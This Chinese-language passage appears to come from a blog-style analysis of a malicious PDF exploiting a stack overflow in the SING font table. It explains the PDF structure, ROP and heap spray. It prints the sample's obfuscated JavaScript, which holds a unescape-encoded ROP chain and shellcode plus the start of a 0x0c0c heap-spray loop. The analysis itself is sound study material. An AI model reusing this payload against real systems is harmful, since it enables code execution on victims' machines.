>> `0000000015 00000 n`表示对象是 **1** ，其偏移为 **0000000015** ， **00000**
表示该对象未被修改过，其最大值是$2^5$=65535， **n** 表示该对象正在使用
    * **4.尾部**
                trailer
        >
        startxref
        44943
        %%EOF
      * Size 15：说明文件对象数量为15（和上面的对象署一致）
      * Root 1 0 R：根对象号为1
      * 44943：表示交叉引用表的偏移地址，从而从文档中找到所有对象的相对地址，进而访问对象
  * 这次文件的payload所在地：使用 **PDFStreamDumper** 打开文件，第一个文件体 
        >
试用了`/OpenAction 11 0 R`，打开第11个文件体
        >
发先调用了JavaScript的脚本，而且脚本在第12个文件体中
        var VJvRZHcFpjfNEpkTtnYAuxxDnlJnxpugNnYjtZbeoutMEBGfJGMSwXcJQNoxFbuCEXBnLOePlaWTfwDSAywBDbWXmgXXlgtJ = unescape;
    var hIT = VJvRZHcFpjfNEpkTtnYAuxxDnlJnxpugNnYjtZbeoutMEBGfJGMSwXcJQNoxFbuCEXBnLOePlaWTfwDSAywBDbWXmgXXlgtJ( '%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%uccdb%u74d9%uf424%u74ba%u5cde%u5eed%uc92b%u31b1%uc683%u3104%u1456%u5603%u3c60%u11a9%u4260%uea52%u2370%u0fda%u6341%u44b8%u53f1%u09ca%u18fd%ub99e%u6c76%ucd37%udb3f%ue061%u70c0%u6351%u8b42%u4386%u447b%u82db%ub9bc%ud616%ub515%uc785%u8312%u6315%u0568%u901e%u2438%u070f%u7f33%ua98f%u0b90%ub186%u36f5%u4950%ucdcd%u9b63%u2d1c%ue2cf%udc91%u2211%u3f15%u5a64%uc266%u997f%u1815%u3af5%uebbd%ue6ad%u3f3c%u6c2b%uf432%u2a3f%u0b56%u4093%u8062%u8712%ud2e3%u0330%u81a8%u1259%u6714%u4465%ud8f7%u0ec3%u0c15%u4d7e%ud373%ueb0c%ud331%uf40e%ubc65%u7f3f%ubbea%uaabf%u334f%uf78a%udcf9%u6253%u80b8%u5863%ubcfe%u69e7%u3b7e%u1bf7%u077b%uf0bf%u18f1%uf72a%u19a6%u947f%u8a29%u75e3%u2acc%u8981' );
    var lQAMgbHqymZT = VJvRZHcFpjfNEpkTtnYAuxxDnlJnxpugNnYjtZbeoutMEBGfJGMSwXcJQNoxFbuCEXBnLOePlaWTfwDSAywBDbWXmgXXlgtJ( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );
    while (lQAMgbHqymZT.length + 20 + 8 
> 所有的ShellCode都被转化为了十六进制的转义序列，经过unescape解码之后存储在var_shellcode之中，var_c变量存储了%u0c0c%u0c0c，接下来用了一个while循环叠加var_c，用来覆盖内存的数据。
>
> 采用0x0c0c0c0c作为滑板指令的原因是因为它对应的指令是`or
> al,0x0C`，这样的指令执行的效果对al寄存器不会产生任何影响[[4]](https://blog.csdn.net/qq_38474570/article/details/91346316)
至于为什么用JS，在后面会讲到
在第10个文件体中，我们可以找到payload
###  DLL文件
相当于一个游戏的mod，全称： **Dynamic Link Library**
，包含可由多个程序，同时使用的代码和数据的库，多用于windows；对应在Linux上是libxx.so.x。
###  字体文件
我们要加入一种字体（如“微软雅黑”），就肯定有一份表，表上有所有的字体（或合成规则），而且这种字体文件一般以 **.TFF** 为后缀
就是文档的字体，比如对于英文来讲，26个字母每一个都有一种样式。这里面受影响的是TTF中 **SING字体表** 的 **uniqueName字体**
TTF(TrueTypeFont)是Apple公司和Microsoft公司共同推出的字体文件格式,随着windows的流行，已经变成最常用的一种字体文件表示方式。
在后续分析中会用到，那个在时候再说具体的引用
###  `strcat`函数
把src所指向的字符串（包括“\0”）复制到dest所指向的字符串后面（删除 _dest原来末尾的“\0”）。要保证_ dest足够长，以容纳被复制进来的
_src。_ src中原有的字符不变。返回指向dest的指针。
**这里就是strcat的返回字串的大小没有设置正确，导致了栈溢出**
## ROP(Return Oriented Programming)
算是二进制研究的一个基本功了吧
> 随着 NX 保护的开启（在windows上是 **DEP**
> ），以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented
> Programming)，其主要思想是在 **栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets
> )来改变某些寄存器或者变量的值，从而控制程序的执行流程。** 所谓gadgets 就是以 ret
> 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程 ——《CTFwiki》
## Heap Spray（堆喷）
###  堆喷的概念
> Heap Spray是在shellcode的前面加上大量的slide
> code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致shellcode的执行[[5]](https://blog.csdn.net/magictong/article/details/7391397)
Heap
Spray只是一种辅助技术，需要结合其他的栈溢出或堆溢出等等各种溢出技术才能发挥作用。这种技术在CTF中不太常见，但在平时的二进制漏洞挖掘中十分常见。
###  Heap Spray原理
由上面的概念我们可以想象到，堆栈的分布[[6]](https://www.anquanke.com/post/id/85586)
我们可以在堆上分配一系列内存块(包含shellcode)， 然后利用漏洞实现4字节改写EIP，就可以跳去执行堆上的代码。
Javascript可以直接在堆上分配字符串，通过巧妙的布置堆我们可以exploit。 **这也是我们在这里使用JS来放置shellcode的一个原因**
。
当申请大量的内存到时候，堆很有可能覆盖到的地址是0x0A0A0A0A（160M），0x0C0C0C0C（192M），0x0D0D0D0D（208M）等等几个地址，可以参考下面的简图说明[[5]](https://blog.csdn.net/magictong/article/details/7391397)
常规布局
堆喷后的布局
堆喷射是比较简单的一种利用方式；不同以往将 **shellcode** 存放在栈中，堆喷射将 **shellcode** 放在堆中，通过多种溢出方式组合使
**eip** 执行到0x0c0c0c0c之类（以确保运行时包含shellcode）的堆空间，好处是我们不用覆盖 **eip** 寄存器
> `Heap Spray`是在`shellcode`的前面加上大量的`slide
> code`(滑板指令)，组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致`shellcode`的执行。
>
> 传统`slide
> code`(滑板指令)一般是`NOP`指令，但是随着一些新的攻击技术的出现，逐渐开始使用更多的类`NOP`指令，譬如`0x0C`(`0x0C0C`代表的`x86`指令是`OR